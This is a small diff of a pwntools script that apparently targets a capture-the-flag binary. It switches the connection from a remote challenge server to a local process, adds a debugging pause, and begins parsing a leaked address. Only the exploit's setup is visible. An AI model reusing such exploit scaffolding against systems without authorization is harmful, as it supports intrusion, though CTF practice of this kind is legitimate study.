@@ -2,8 +2,10 @@ from pwn import *
 
 context.log_level = 'DEBUG'
 
-# p = process('../file/1d3c852354df4609bf8e56fe8e9df316')
-p = remote('61.147.171.105', '54366')
+p = process('../file/1d3c852354df4609bf8e56fe8e9df316')
+# p = remote('61.147.171.105', '54366')
+
+input('continue?')
 
 p.recvuntil(b'secret[0] is ')
 secret_addr = int(p.recvuntil(b'\n', drop=True), 16)
